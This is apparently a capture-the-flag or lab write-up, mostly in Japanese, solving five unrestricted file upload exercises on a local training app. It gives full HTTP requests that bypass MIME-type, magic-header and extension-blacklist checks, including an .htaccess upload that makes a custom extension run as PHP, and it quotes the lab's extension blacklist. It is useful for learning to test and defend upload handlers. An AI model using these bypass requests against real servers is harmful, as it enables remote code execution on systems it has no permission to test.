# Unrestricted File Upload
It is a security vulnerability that occurs as a result of the inability to fully control the files received from the user and may result in remote code execution on the server.

## 1.Unrestricted
`Allowed formats: gif, jpg, jpeg, png`と記述があるが、何も制御されていない。

PHPを素直にアップロードすれば動作する。
```http
POST /lab/file-upload/unrestricted/ HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 321
Origin: http://127.0.0.1:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2ogukNAeK3vSdYBq
Referer: http://127.0.0.1:1337/lab/file-upload/unrestricted/

------WebKitFormBoundary2ogukNAeK3vSdYBq
Content-Disposition: form-data; name="input_image"; filename="info.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
<hr>
------WebKitFormBoundary2ogukNAeK3vSdYBq
Content-Disposition: form-data; name="submit"


------WebKitFormBoundary2ogukNAeK3vSdYBq--
```

## 2.MIME Type
phpファイルそのままではアップロードできない。

タイトル通り、アップロード時のMIME Typeをチェックしているため、Content-Typeを画像ファイルに差し替えるとPHPをアップロードできる。
```http
POST /lab/file-upload/mime-type/ HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 307
Origin: http://127.0.0.1:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryra8qozLEk9v3sbI9
Referer: http://127.0.0.1:1337/lab/file-upload/unrestricted/

------WebKitFormBoundaryra8qozLEk9v3sbI9
Content-Disposition: form-data; name="input_image"; filename="info.php"
Content-Type: image/jpeg

<?php phpinfo(); ?>
<hr>
------WebKitFormBoundaryra8qozLEk9v3sbI9
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryra8qozLEk9v3sbI9--
```

## 3.Magic Header
phpファイルそのままではアップロードできない。

ファイルの内容から画像か否か判断しているため、gifファイルに偽装したPHPファイルをアップロードする。
```http
Host: 127.0.0.1:1337
Content-Length: 327
Origin: http://127.0.0.1:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3dhNIviZIx4AkYmV
Referer: http://127.0.0.1:1337/lab/file-upload/unrestricted/

------WebKitFormBoundary3dhNIviZIx4AkYmV
Content-Disposition: form-data; name="input_image"; filename="info.php"
Content-Type: application/octet-stream

GIF87a<?php phpinfo(); ?>
<hr>
------WebKitFormBoundary3dhNIviZIx4AkYmV
Content-Disposition: form-data; name="submit"


------WebKitFormBoundary3dhNIviZIx4AkYmV--
```

## 4.Blacklist-1
拡張子`php`をブロックしている。

比較的マイナーな拡張子`phtml`を使用してアップロードできる。
```http
POST /lab/file-upload/blacklist-1/ HTTP/1.1
Content-Length: 323
Origin: http://127.0.0.1:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwPOLucdLd4VaHoG
Referer: http://127.0.0.1:1337/lab/file-upload/unrestricted/


------WebKitFormBoundarySwPOLucdLd4VaHoG
Content-Disposition: form-data; name="input_image"; filename="info.phtml"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
<hr>
------WebKitFormBoundarySwPOLucdLd4VaHoG
Content-Disposition: form-data; name="submit"


------WebKitFormBoundarySwPOLucdLd4VaHoG--
```

## 5.Blacklist-2
ソースを見ると多くのバリエーションの拡張子がブロックされている。

```php
$extensions = array("php","php1","php2","php3","php4","php5","php6","php7","php8","pht","phtm","phar","phps","html","htm","shtml","phtml","sh","ini","css","js"); //blacklist
```

試していくと、`.htaccess`ファイルをアップロードできることが分かる。  
好きな拡張子をphp実行ファイルとして定義してみる。ここでは`.phpx`とした。
```http
POST /lab/file-upload/blacklist-2/ HTTP/1.1
Content-Length: 334
Origin: http://127.0.0.1:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLrSXe2AxaysWTIw7
Referer: http://127.0.0.1:1337/lab/file-upload/unrestricted/

------WebKitFormBoundaryLrSXe2AxaysWTIw7
Content-Disposition: form-data; name="input_image"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .phpx
------WebKitFormBoundaryLrSXe2AxaysWTIw7
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryLrSXe2AxaysWTIw7--
```

これで`.phpx`ファイルがPHPとして動作してくれるはずである。  
phpxファイルを作成し、ノーチェックでアップロード完了。動作することが確認できる。
```http
POST /lab/file-upload/blacklist-2/ HTTP/1.1
Content-Length: 322
Origin: http://127.0.0.1:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBYa0o1DpzlNoO2eG
Referer: http://127.0.0.1:1337/lab/file-upload/unrestricted/


------WebKitFormBoundaryBYa0o1DpzlNoO2eG
Content-Disposition: form-data; name="input_image"; filename="info.phpx"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
<hr>
------WebKitFormBoundaryBYa0o1DpzlNoO2eG
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryBYa0o1DpzlNoO2eG--
```
